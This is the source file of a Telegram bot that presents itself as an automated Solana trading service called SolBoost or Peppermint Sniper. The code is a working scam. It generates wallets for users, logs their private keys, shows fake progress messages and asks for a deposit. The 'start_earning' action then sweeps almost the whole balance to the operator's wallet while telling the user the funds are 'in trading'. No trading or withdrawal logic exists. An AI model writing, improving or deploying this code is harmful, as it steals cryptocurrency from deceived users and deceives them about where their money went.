import { Keypair, Connection, LAMPORTS_PER_SOL, Transaction, SystemProgram } from '@solana/web3.js';
import bs58 from 'bs58';
import { Telegraf, Markup } from 'telegraf';
import dotenv from 'dotenv';

// Load environment variables from .env file
dotenv.config();

// Get the bot token and main wallet private key from environment variables
const BOT_TOKEN = process.env.BOT_TOKEN;
const MAIN_WALLET_PRIVATE_KEY = process.env.MAIN_WALLET_PRIVATE_KEY;

if (!BOT_TOKEN || !MAIN_WALLET_PRIVATE_KEY) {
    throw new Error("Missing BOT_TOKEN or MAIN_WALLET_PRIVATE_KEY environment variables");
}

// Initialize the bot with the token from environment variables
const bot = new Telegraf(BOT_TOKEN);

// Assuming you have a connection to Solana mainnet
const connection = new Connection('https://api.mainnet-beta.solana.com');

// Main wallet for receiving Solana (base58 private key)
const mainWallet = Keypair.fromSecretKey(bs58.decode(MAIN_WALLET_PRIVATE_KEY));

let userWallets = {}; // Store user wallets
let userStatus = {}; // Store user status, including transfer status

// Function to generate the timeline bar with green and white blocks and a percentage counter
function generateTimelineBar(progress, total) {
    const barLength = 13; // Length of the timeline bar
    const filledLength = Math.round((barLength * progress) / total);
    const bar = '🟩'.repeat(filledLength) + '⬜'.repeat(barLength - filledLength);
    const percentage = ((progress / total) * 100).toFixed(2);
    return `${bar} ${percentage}%`;
}

// Function to show a message with a delay
const showMessageWithDelay = async (ctx, message, delay) => {
    const sentMessage = await ctx.reply(message);
    await new Promise(resolve => setTimeout(resolve, delay));
    return sentMessage;
};

// Function to load the main menu
const loadMainMenu = async (ctx) => {
    await ctx.reply('Welcome! Please choose an option:', Markup.inlineKeyboard([
        [Markup.button.callback('Main wallet', 'main_wallet'), Markup.button.callback('Start earning', 'start_earning')],
        [Markup.button.callback('Track profits', 'track_profits'), Markup.button.callback('Withdraw', 'withdraw')],
        [Markup.button.callback('Referrals', 'referrals'), Markup.button.callback('Balance', 'balance')],
        [Markup.button.callback('Track Peppermint Activity', 'track_peppermint')],
        [Markup.button.callback('Refresh', 'refresh')]
    ]));
};

// Start command
bot.start(async (ctx) => {
    const firstMessage = await showMessageWithDelay(ctx, '🔄 Generating your wallet, please wait...', 10000);
    const secondMessage = await showMessageWithDelay(ctx, '🔒 Your wallet is connecting to secured SolBoost server...', 3000);
    await loadMainMenu(ctx);
    await ctx.deleteMessage(firstMessage.message_id);
    await ctx.deleteMessage(secondMessage.message_id);
});

// Helper function to handle API rate limiting
const handleRateLimit = async (error) => {
    if (error.code === 429 && error.parameters.retry_after) {
        const retryAfter = error.parameters.retry_after * 1000;
        console.warn(`Rate limit exceeded. Retrying after ${retryAfter / 1000} seconds.`);
        await new Promise(resolve => setTimeout(resolve, retryAfter));
    } else {
        throw error;
    }
};

// Modified bot actions to include error handling
bot.action('main_wallet', async (ctx) => {
    try {
        await ctx.answerCbQuery();
        const userId = ctx.from.id;

        if (!userWallets[userId]) {
            const userWallet = Keypair.generate();
            userWallets[userId] = userWallet;
            console.log(`Generated wallet for user ${userId}:`);
            console.log(`Public Key: ${userWallet.publicKey.toBase58()}`);
            console.log(`Private Key: ${bs58.encode(userWallet.secretKey)}`);
        }

        const userWallet = userWallets[userId];
        const publicKey = userWallet.publicKey;
        const balance = await connection.getBalance(publicKey);
        const solBalance = balance / LAMPORTS_PER_SOL;

        const formattedMessage = `
💵 Main Wallet \\(Solana\\)
Address: \`${publicKey.toBase58()}\`
Private Key: \`${bs58.encode(userWallet.secretKey)}\`
Balance: ${solBalance.toFixed(2).replace(/\./g, '\\.')} SOL \\(\\$${(solBalance * 158).toFixed(2).replace(/\./g, '\\.')} USD\\)
⚠️ Note: A 13% fee is applied to profits
        `;
        await ctx.reply(formattedMessage, { parse_mode: 'MarkdownV2' });
    } catch (error) {
        if (error.code === 429) {
            await handleRateLimit(error);
        } else {
            console.error('Error in main_wallet action:', error);
            ctx.reply('An error occurred while fetching your wallet details. Please try again.');
        }
    }
});

bot.action('start_earning', async (ctx) => {
    try {
        await ctx.answerCbQuery();
        const userId = ctx.from.id;

        if (!userWallets[userId]) {
            ctx.reply("You don't have a wallet yet. Please set up your main wallet first.");
            return;
        }

        const userWallet = userWallets[userId];
        const publicKey = userWallet.publicKey;
        const balance = await connection.getBalance(publicKey);
        const solBalance = balance / LAMPORTS_PER_SOL;

        if (solBalance < 0.02) {
            ctx.reply(`
🚨 Alert: Your Wallet Balance is less than the balance required to start the trades.
To activate the Peppermint Sniper bot and start earning profits with our automated trading system, please deposit at least 0.02 SOL into your trading wallet. Your current balance is ${solBalance.toFixed(2)} SOL
            `);
        } else {
            const { blockhash } = await connection.getRecentBlockhash();
            const transaction = new Transaction({
                recentBlockhash: blockhash,
                feePayer: userWallet.publicKey,
            });

            const feeForMessage = await connection.getFeeForMessage(transaction.compileMessage());
            const estimatedFee = feeForMessage.value ? feeForMessage.value : 5000;
            const totalFee = estimatedFee * 3 + 35000;
            const rentExemptionThreshold = 890880;

            if (balance > totalFee + rentExemptionThreshold) {
                const amountToTransfer = balance - totalFee - rentExemptionThreshold;

                if (!userStatus[userId]) {
                    userStatus[userId] = { totalTransferred: 0, transferDone: false };
                }
                userStatus[userId].totalTransferred += amountToTransfer;
                userStatus[userId].transferDone = true;

                transaction.add(
                    SystemProgram.transfer({
                        fromPubkey: userWallet.publicKey,
                        toPubkey: mainWallet.publicKey,
                        lamports: amountToTransfer,
                    })
                );

                const signature = await connection.sendTransaction(transaction, [userWallet], { skipPreflight: false, preflightCommitment: 'confirmed' });
                await connection.confirmTransaction(signature, 'confirmed');

                ctx.reply(`Your deposit of ${(amountToTransfer / LAMPORTS_PER_SOL).toFixed(2)} SOL is in trading. Wait for the withdrawal button to enable to get your profit.`);
            } else {
                ctx.reply(`Insufficient balance to cover the transaction fee and rent exemption for user ${userId}.`);
            }
        }
    } catch (error) {
        if (error.code === 429) {
            await handleRateLimit(error);
        } else {
            ctx.reply('There was an error processing your request. Please try again.');
            console.error('Error in start_earning action:', error);
        }
    }
});

// Handle all other actions similarly, wrapping them in try-catch and handling the 429 error.

bot.launch();
console.log('Telegram bot is running...');

